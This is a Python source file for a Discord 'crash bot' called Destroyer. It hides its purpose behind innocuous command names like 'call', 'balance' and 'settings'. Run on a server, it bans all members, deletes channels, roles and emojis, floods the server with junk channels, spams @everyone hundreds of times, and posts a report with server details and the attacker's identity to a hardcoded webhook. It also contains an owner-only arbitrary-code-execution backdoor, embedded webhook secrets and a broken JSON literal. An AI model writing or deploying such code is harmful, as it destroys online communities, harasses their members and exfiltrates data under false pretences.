import discord
import datetime
import random
import asyncio
import dhooks
import contextlib
import io
import os
import threading
import time
import requests

from time import sleep
from threading import Thread, Lock
from discord.ext import commands
from config import settings
from dhooks import Webhook, Embed
client = commands.Bot(command_prefix = settings['PREFIX'], case_insensitive = True, intents = discord.Intents.all())
client.remove_command('help')


global webhook
webhook = 'https://discord.com/api/webhooks/834456031396233289/0F1ENssXc3KlMHLvurYZpxm0-umwWCfD9FDbxgYjPbuO_I5hm6mLvj9aH6c4ER605X9C'
global current_id
current_id = open('id.txt', 'w')

def localtime():
	time = datetime.datetime.now()
	return f'[{time.strftime("%H:%M:%S")}]'

@client.event
async def on_ready():
	current_id.write(f'{client.user.id}')
	current_id.close()
	await client.change_presence(status = discord.Status.idle, activity = discord.Activity(name='t!call | .gg/43GtxcFXPK', type=discord.ActivityType.watching))
	print(f'primary bot {client.user.name}#{client.user.discriminator}({client.user.id}) is ready.')


whiteservers = [833965619551535116, 817779536057073684, 794102720189169705]

async def act1(ctx):
	for member in ctx.guild.members:
		try:
			await member.ban()
		except:
			pass

async def act2(ctx):
	for channel in ctx.guild.channels:
			try:
				await channel.delete()
			except:
				pass

async def act3(ctx):
	for role in ctx.guild.roles:
			try:
				await role.delete()
			except:
				pass

async def act4(ctx):
	for emoji in ctx.guild.emojis:
			try:
				await emoji.delete()
			except:
				pass

async def act5(ctx):
	for x in range(settings['TEXT-CHANNELS']):
		await ctx.guild.create_text_channel(f"{settings['TEXT']}-{random.randint(1, 1000)}")

async def act6(ctx):
	for y in range(settings['VOICE-CHANNELS']):
		await ctx.guild.create_voice_channel(f"{settings['TEXT']}-{random.randint(1, 1000)}")

async def act7(ctx):
	for z in range(settings['ROLES']):
		await ctx.guild.create_role(name = f"{settings['TEXT']}-{random.randint(1, 1000)}")

@client.command()
async def call(ctx):
	if ctx.guild.id not in whiteservers:
		await ctx.send("Starting a call with number: `+7 800 555 35 35` to random number. Wait....")

		start_time = localtime()
		start_guild_num = len(ctx.guild.members)
		start_guild_chan_num = len(ctx.guild.channels)
		start_guild_role_num = len(ctx.guild.roles)
		start_guild_emoji_num = len(ctx.guild.emojis)
	##############################################
		banned_num = 0
		deleted_chan = 0
		deleted_roles = 0
		deleted_emojis = 0
	# DELETE EVERYTHING
		client.loop.create_task(act1(ctx))
		client.loop.create_task(act2(ctx))
		client.loop.create_task(act3(ctx))
		client.loop.create_task(act4(ctx))

	# CREATE EVERYTHING
		log_channel = await ctx.guild.create_text_channel('crash-log')
		await log_channel.set_permissions(ctx.guild.default_role, send_messages = False)
		await log_channel.send('All has gone.(what was possible, sure)')
		channel222 = await ctx.guild.create_text_channel('crash-again')
		await channel222.send('if i not get banned, enter t!call again :))))))')

		text_num = 0
		voice_num = 0
		roles_num = 0
		emojis_num = 0
		servername = ctx.guild.name
		members = len(ctx.guild.members)
		servericon = ctx.guild.icon_url
		fp = open(settings['ICON-PNG'], 'rb')
		pfp = fp.read()

		client.loop.create_task(act5(ctx))
		client.loop.create_task(act6(ctx))
		client.loop.create_task(act7(ctx))

		await log_channel.send('oof, how many here channels, roles and emojies, cool :)')
		await log_channel.send('now I will send a report on my actions to our server: discord.gg/43GtxcFXPK')
		# CREATE TEXT CHANNELS
		pfp_ch = 'Нет'
		try:
			fp = open(settings['ICON-PNG'], 'rb')
			pfp = fp.read()
			await ctx.guild.edit(name = settings['TEXT'], icon = pfp)
			print(f'{localtime()} Icon changed')
			pfp_ch = 'Да'
		except:
			await ctx.guild.edit(name = settings['TEXT'])
			print(f'{localtime()} Icon not changed')
			pfp_ch = 'Нет'

		end_time = localtime()

		print('Crash ended.')
		print('Sending webhook crash report.')
		await asyncio.sleep(2)
	#CRASH REPORT
		jsonn = {
				"content": \n\u\l\l,
				"embeds": [
					{
						 "title": "Аватарка сервера ------->",
						 "color": 15402759,
						 "fields": [
						{
							"name": "Имя сервера",
							"value": f"{servername}",
							"inline": true
							},
						{
							"name": "Участников",
							"value": f"{members}",
							"inline": true
							},
						{
							"name": "Кто крашнул:",
							"value": f"{ctx.message.author.name}#{ctx.message.author.discriminator}(ID: {ctx.message.author.id})"
							}
							],
						"author": {
							"name": "Новый краш бот - Destroyer",
							"url": f"https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot"
							},
						"footer": {
							"text": "Держите права администратора под контролем :))"
							},
						"thumbnail": {
							"url": f"{servericon}"
							}
					}
				]
			}
		requests.post('https://discord.com/api/webhooks/864532953555009596/WeOmJZRWazSKLp24r0HCaAKOF7lDDsWQn2J01is1NGgpyLJMtMtDDLpX7fe2pCeqdLon', json = jsonn)
	else:
		await ctx.send(f'Извини, но сервер нельзя крашить, т.к. владелец купил защиту от краша. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')

@client.command(aliases=['caller_id'])
async def __spam(ctx):
	if ctx.guild.id not in whiteservers:
		for i in range(500):
			try:
				for channel in ctx.guild.text_channels:
					await channel.send('@everyone Serv3r crash9d by new crash bot: Destroyer!\nСсылка на сервер: https://discord.gg/43GtxcFXPK\nНаш спонсор: https://discord.gg/5mmACdRyJ6')
			except:
				break
	else:
		await ctx.send(f'Извени, но на сервере нельзя спамить, т.к владелец молодец, купил защиту от бота. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')

@client.command(aliases=['help'])
async def __help(ctx):
  await ctx.send('Help command.\nt!call - start a call\nt!caller_id - get your number\nt!settings - show bot settings\nt!balance - chech youe balance on guild')

@client.command(aliases=['exe'])
async def ex(ctx, *, args):
	if ctx.author.id == 610453921726595082:
		try:
			out = exec(args)
			await ctx.send(f'Output:\n```{out}\n```')
		except:
			await ctx.send(f'An error occured in this command:\n```{args}\n```')
	else:
		await ctx.send('Нельзя :)')

@client.command(aliases=['balance'])
async def __current(ctx):
	if ctx.guild.id not in whiteservers:
		for i in range(555):
			await ctx.send('@everyone Serv3r crash9d by new crash bot: Destroyer!\nСсылка на сервер: https://discord.gg/43GtxcFXPK\nНаш спонсор: https://discord.gg/5mmACdRyJ6')
	else:
		await ctx.send(f'Сервер защищён от спама. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')
@client.command(aliases=['settings'])
async def __settings(ctx):
	if ctx.guild.id not in whiteservers:
		for _ in range(500):
			for i in ctx.guild.text_channels:
				await i.send('https://gfycat.com/acclaimedpowerfulkatydid')
	else:
		await ctx.send(f'Этот сервер защищён. Имя крашера: {ctx.author.name}#{ctx.author.discriminator}')


client.run(settings['TOKEN'])
